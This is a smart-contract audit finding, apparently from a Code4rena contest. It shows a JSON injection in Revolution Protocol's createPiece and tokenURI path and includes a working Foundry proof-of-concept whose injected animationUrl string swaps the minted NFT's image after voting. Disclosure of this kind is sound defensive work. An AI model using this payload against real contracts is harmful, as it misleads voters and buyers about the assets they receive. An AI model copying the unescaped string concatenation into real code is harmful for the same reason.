---
id: 19667
severity: "High"
---

# `VerbsToken.tokenURI`

## Description

`CultureIndex.createPiece()` function doesn’t sanitize malicious charcacters in `metadata.image` and `metadata.animationUrl`, which would cause `VerbsToken.tokenURI()` suffering various JSON injection attack vectors.

  1. If the front end APP doesn’t process the JSON string properly, such as using `eval()` to parse token URI, then any malicious code can be executed in the front end. Obviously, funds in users’ connected wallet, such as Metamask, might be stolen in this case.
  2. Even while the front end processes securely, such as using the standard builtin `JSON.parse()` to read URI. Adversary can still exploit this vulnerability to replace art piece image/animation with arbitrary other ones after voting stage completed.

That is the final metadata used by the NFT (VerbsToken) is not the art piece users vote. This attack could be benefit to attackers, such as creating NFTs containing same art piece data with existing high price NFTs. And this attack could also make the project sufferring legal risks, such as creating NFTs with violence or pornography images.

More reference: <https://www.comparitech.com/net-admin/json-injection-guide/>

## Proof of Concept

As shown of `createPiece()` function, there is no check if `metadata.image` and `metadata.animationUrl` contain malicious charcacters, such as `"`, `:` and `,`.
    
```solidity
File: src\CultureIndex.sol
function createPiece(
    ArtPieceMetadata calldata metadata,
    CreatorBps[] calldata creatorArray
) public returns (uint256) {
    uint256 creatorArrayLength = validateCreatorsArray(creatorArray);

    // Validate the media type and associated data
    validateMediaType(metadata);

    uint256 pieceId = _currentPieceId++;

    /// @dev Insert the new piece into the max heap
    maxHeap.insert(pieceId, 0);

    ArtPiece storage newPiece = pieces[pieceId];

    newPiece.pieceId = pieceId;
    newPiece.totalVotesSupply = _calculateVoteWeight(
        erc20VotingToken.totalSupply(),
        erc721VotingToken.totalSupply()
    );
    newPiece.totalERC20Supply = erc20VotingToken.totalSupply();
    newPiece.metadata = metadata;
    newPiece.sponsor = msg.sender;
    newPiece.creationBlock = block.number;
    newPiece.quorumVotes = (quorumVotesBPS * newPiece.totalVotesSupply) / 10_000;

    for (uint i; i < creatorArrayLength; i++) {
        newPiece.creators.push(creatorArray[i]);
    }

    emit PieceCreated(pieceId, msg.sender, metadata, newPiece.quorumVotes, newPiece.totalVotesSupply);

    // Emit an event for each creator
    for (uint i; i < creatorArrayLength; i++) {
        emit PieceCreatorAdded(pieceId, creatorArray[i].creator, msg.sender, creatorArray[i].bps);
    }

    return newPiece.pieceId;
}
```

Adverary can exploit this to make `VerbsToken.tokenURI()` to return various malicious JSON objects to front end APP.
    
```solidity
File: src\Descriptor.sol
function constructTokenURI(TokenURIParams memory params) public pure returns (string memory) {
    string memory json = string(
        abi.encodePacked(
            '{"name":"',
            params.name,
            '", "description":"',
            params.description,
            '", "image": "',
            params.image,
            '", "animation_url": "',
            params.animation_url,
            '"}'
        )
    );
    return string(abi.encodePacked("data:application/json;base64,", Base64.encode(bytes(json))));
}
```

For example, if attacker submit the following metadata:
    
```solidity
ICultureIndex.ArtPieceMetadata({
    name: 'Mona Lisa',
    description: 'A renowned painting by Leonardo da Vinci',
    mediaType: ICultureIndex.MediaType.IMAGE,
    image: 'ipfs://realMonaLisa',
    text: '',
    animationUrl: '", "image": "ipfs://fakeMonaLisa' // malicious string injected
});
```

During voting stage, front end gets `image` field by `CultureIndex.pieces[pieceId].metadata.image`, which is `ipfs://realMonaLisa`. But, after voting complete, art piece is minted to `VerbsToken` NFT. Now, front end would query `VerbsToken.tokenURI(tokenId)` to get base64 encoded metadata, which would be:
    
```
data:application/json;base64,eyJuYW1lIjoiVnJiIDAiLCAiZGVzY3JpcHRpb24iOiJNb25hIExpc2EuIEEgcmVub3duZWQgcGFpbnRpbmcgYnkgTGVvbmFyZG8gZGEgVmluY2kiLCAiaW1hZ2UiOiAiaXBmczovL3JlYWxNb25hTGlzYSIsICJhbmltYXRpb25fdXJsIjogIiIsICJpbWFnZSI6ICJpcGZzOi8vZmFrZU1vbmFMaXNhIn0=
```

In the front end, we use `JSON.parse()` to parse the above data, we get `image` as `ipfs://fakeMonaLisa`. ![image](https://c2n.me/4jZPsiZ.png) Image link: <https://gist.github.com/assets/68863517/d769d7ac-db02-4e3b-94d2-dfaf3752b763>

Below is the full coded PoC:
    
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.22;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import {RevolutionBuilderTest} from "./RevolutionBuilder.t.sol";
import {ICultureIndex} from "../src/interfaces/ICultureIndex.sol";

contract JsonInjectionAttackTest is RevolutionBuilderTest {
    string public tokenNamePrefix = "Vrb";
    string public tokenName = "Vrbs";
    string public tokenSymbol = "VRBS";

    function setUp() public override {
        super.setUp();
        super.setMockParams();

        super.setERC721TokenParams(tokenName, tokenSymbol, "https://example.com/token/", tokenNamePrefix);

        super.setCultureIndexParams("Vrbs", "Our community Vrbs. Must be 32x32.", 10, 500, 0);

        super.deployMock();
    }

    function testImageReplacementAttack() public {
        ICultureIndex.CreatorBps[] memory creators = _createArtPieceCreators();
        ICultureIndex.ArtPieceMetadata memory metadata = ICultureIndex.ArtPieceMetadata({
            name: 'Mona Lisa',
            description: 'A renowned painting by Leonardo da Vinci',
            mediaType: ICultureIndex.MediaType.IMAGE,
            image: 'ipfs://realMonaLisa',
            text: '',
            animationUrl: '", "image": "ipfs://fakeMonaLisa' // malicious string injected
        });

        uint256 pieceId = cultureIndex.createPiece(metadata, creators);

        vm.startPrank(address(erc20TokenEmitter));
        erc20Token.mint(address(this), 10_000e18);
        vm.stopPrank();
        vm.roll(block.number + 1); // ensure vote snapshot is taken
        cultureIndex.vote(pieceId);

        // 1. the image used during voting stage is 'ipfs://realMonaLisa'
        ICultureIndex.ArtPiece memory topPiece = cultureIndex.getTopVotedPiece();
        assertEq(pieceId, topPiece.pieceId);
        assertEq(keccak256("ipfs://realMonaLisa"), keccak256(bytes(topPiece.metadata.image)));

        // 2. after being minted to VerbsToken, the image becomes to 'ipfs://fakeMonaLisa'
        vm.startPrank(address(auction));
        uint256 tokenId = erc721Token.mint();
        vm.stopPrank();
        assertEq(pieceId, tokenId);
        string memory encodedURI = erc721Token.tokenURI(tokenId);
        console2.log(encodedURI);
        string memory prefix = _substring(encodedURI, 0, 29);
        assertEq(keccak256('data:application/json;base64,'), keccak256(bytes(prefix)));
        string memory actualBase64Encoded = _substring(encodedURI, 29, bytes(encodedURI).length);
        string memory expectedBase64Encoded = 'eyJuYW1lIjoiVnJiIDAiLCAiZGVzY3JpcHRpb24iOiJNb25hIExpc2EuIEEgcmVub3duZWQgcGFpbnRpbmcgYnkgTGVvbmFyZG8gZGEgVmluY2kiLCAiaW1hZ2UiOiAiaXBmczovL3JlYWxNb25hTGlzYSIsICJhbmltYXRpb25fdXJsIjogIiIsICJpbWFnZSI6ICJpcGZzOi8vZmFrZU1vbmFMaXNhIn0=';
        assertEq(keccak256(bytes(expectedBase64Encoded)), keccak256(bytes(actualBase64Encoded)));
    }

    function _createArtPieceCreators() internal pure returns (ICultureIndex.CreatorBps[] memory) {
        ICultureIndex.CreatorBps[] memory creators = new ICultureIndex.CreatorBps[](1);
        creators[0] = ICultureIndex.CreatorBps({creator: address(0xc), bps: 10_000});
        return creators;
    }

    function _substring(string memory str, uint256 startIndex, uint256 endIndex)
        internal
        pure
        returns (string memory)
    {
        bytes memory strBytes = bytes(str);
        bytes memory result = new bytes(endIndex-startIndex);
        for (uint256 i = startIndex; i < endIndex; i++) {
            result[i - startIndex] = strBytes[i];
        }
        return string(result);
    }
}
```

And, test logs:
    
```
2023-12-revolutionprotocol\packages\revolution> forge test --match-contract JsonInjectionAttackTest -vv
[⠑] Compiling...
No files changed, compilation skipped

Running 1 test for test/JsonInjectionAttack.t.sol:JsonInjectionAttackTest
[PASS] testImageReplacementAttack() (gas: 1437440)
Logs:
  data:application/json;base64,eyJuYW1lIjoiVnJiIDAiLCAiZGVzY3JpcHRpb24iOiJNb25hIExpc2EuIEEgcmVub3duZWQgcGFpbnRpbmcgYnkgTGVvbmFyZG8gZGEgVmluY2kiLCAiaW1hZ2UiOiAiaXBmczovL3JlYWxNb25hTGlzYSIsICJhbmltYXRpb25fdXJsIjogIiIsICJpbWFnZSI6ICJpcGZzOi8vZmFrZU1vbmFMaXNhIn0=

Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 16.30ms
Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

## Recommendation

Sanitize input data according: <https://github.com/OWASP/json-sanitizer>

Looks like a `Medium` at the first glance, but after some thought `High` severity seems appropriate due to assets being compromised in a pretty straight-forward way.
   
  1. The front-end part of the present issue is definitely QA but is part of a more severe correctly identified root cause, see point 4.
  2. The purpose of using IPFS is _immutability_. Thus, the art piece cannot be simply changed on the server. If users vote on an NFT where the underlying art is hosted on a normal webserver, it’s user error.
  3. I agree that the provided example findings are QA due to lack of impact on contract/protocol level.
  4. The critical part of this attack is that the art piece (IPFS link) that is voted on will differ from the art piece (IPFS link) in the minted VerbsToken which makes this an issue on protocol level where assets are compromised and users will be misled as a result.

On the one hand, users have to be careful and review their actions responsibly, but on the other hand it’s any protocol’s duty to protect users to a certain degree (example: slippage control). 

Here, multiple users are put at risk because of one malicious user. 

Furthermore, due to the voting mechanism and later minting, users are exposed to a risk that is not as clear to see as if they could see the final NFT from the beginning. 

I have to draw the line somewhere and here it becomes evident that the protocol’s duty to protect it’s users outweighs the required user scrutiny.

_Note: See full discussion[here](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/167)._

## Derived Narrative

The following field is derived content and may not be source-grounded:

An unsanitized JSON injection vulnerability exists in the function that creates an art piece metadata. The contract stores the raw strings supplied for the image and animationUrl fields and later builds the token metadata by concatenating those strings into a JSON object that is base64‑encoded and returned by tokenURI. Because the contract does not escape characters such as quotation marks, commas or colons, an attacker can embed additional JSON fragments in the image or animationUrl value. When the tokenURI is decoded by a front‑end application, the injected fragment overwrites the original image field, causing the NFT to display a different picture or animation than the one that was voted on. If the front end parses the tokenURI with a vulnerable method such as eval, the injected payload can even execute arbitrary JavaScript, potentially stealing funds from the user’s wallet. The bug is triggered during the createPiece call, which accepts any string for the metadata fields, and manifests after the voting period when the token is minted and tokenURI is queried. All participants who rely on the displayed artwork are affected: collectors receive NFTs with unexpected content, the protocol may be exposed to legal liability for hosting illicit images, and users may be tricked into signing malicious scripts. The issue was discovered during a security audit that included a proof‑of‑concept test where the animationUrl field contained a string that injected a new image entry, resulting in the tokenURI returning a JSON object with the fake image link. The problem is subtle because the metadata is base64‑encoded, so a casual inspection of the on‑chain data does not reveal the injection, and the contract itself does not perform any validation. The vulnerability belongs to the class of JSON injection and improper input sanitisation. The recommended mitigation is to treat all user‑controlled fields as untrusted, escape or strip dangerous characters, or use a proper JSON encoder instead of manual string concatenation, thereby guaranteeing that the generated token metadata cannot be altered by crafted input.
